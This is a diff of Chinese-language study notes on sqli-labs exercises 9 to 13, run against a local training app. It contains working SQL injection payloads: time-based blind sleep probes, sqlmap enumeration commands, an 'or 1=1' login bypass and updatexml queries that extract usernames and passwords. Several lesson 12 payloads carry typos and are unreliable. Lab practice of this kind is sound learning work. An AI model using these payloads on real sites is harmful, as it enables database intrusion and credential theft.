@@ -1,4 +1,4 @@
-# 9
+# 9单引号时间盲注
 时间盲注：通过返回时间来确定是否有该符号【有'情况下id后面跟‘浏览器页面会返回较慢（左上角会转几圈）】
   sleep（）是*等待几秒
 if(A,B,C)`：MySQL 的三元判断
@@ -7,8 +7,8 @@ if(A,B,C)`：MySQL 的三元判断
 - 如果 `A` 为假 → 执行 `C`，也就是 `1`，啥延时都没有
 get
 1.```
-http://127.0.0.1/sqli-labs/Less-9/?id=1%27%20and%20if(length(database())=8,sleep(5),1)%20%23
-卡住就是对的
+http://127.0.0.1/sqli-labs/Less-9/?==🟡id=1%27%20and%20if(length(database())=8,sleep(5),1)%20%23==
+卡住就是对的（payload语句）
 2
 ```
 http://127.0.0.1/sqli-labs/Less-9/?id=1%27%20and%20if(ascii(substr(database(),1,1))=115,sleep(5),1)%20%23
@@ -107,4 +107,44 @@ py -3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1" --technique=T --dbs
 ```
 py -3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1" --technique=T -D security --tables --time-sec=5 --batch --flush-session
 ```
-## ![[Pasted image 20261113192737.png]]![[Pasted image 20261113203007.png]]10
+![[Pasted image 20261113192737.png]]![[Pasted image 20261113203007.png]]10双引号时间盲注
+## 11post单引号
+
+get注入是把参数放在url后面，id是get注入点；
+post参数放在http请求体后
+**请求头**是给服务器看的 “快递标签”（地址、浏览器信息、编码） 告诉服务器怎么处理这次请求（规则、属性）
+**请求体**就是快递包裹里面装的货物（提交的数据）发给服务器的实际数据
+1.输入'显示mysql语法错误，r输入
+```
+' or 1=1 #
+```（or和1中间有空格）
+#绕过密码登录（但是还是要随便填一个)```
+```
+2.Usename输入(查库)
+```
+' and updatexml(1,concat(0x7e,database(),0x7e),1) #
+```
+![[Pasted image 20261120163915.png]]
+查表```
+' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) #```
+![[Pasted image 20261120164142.png]]
+查字段```
+' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1) #```
+![[Pasted image 20261120164204.png]]
+爆密码（updatexml 最多 32 字符，长内容要 mid 分段```
+' and updatexml(1,concat(0x7e,(select mid(group_concat(username,0x7e,password),1,32) from users),0x7e),1) #```
+![[Pasted image 20261120164224.png]]
+## 12post双引号括号
+1.万能绕过原理
+原始```
+SELECT username,password FROM users WHERE username=("$uname") AND password=("$passwd") LIMIT 0,1```
+绕过
+```
+SELECT username,password FROM users WHERE username=("") or 1=1 *") AND password=("123") LIMIT 0,1* ```
+#后面全部无效```
+```
+2.库'and updatexml(1,concat(0x7e,database(),0x7e),1)#
+表' and updataxml(1,concat(0x73,(select group_concat(column_name)from information_schema.columns where table_schema='secuity' and table_name='users')，0x7e,1)#
+## 13post')
+闭合测试时候如果是错误的就没有回显；正确的回显示你的mysql语法错误
+1.相较于前两道题，这道题在绕过登陆时候没有回显
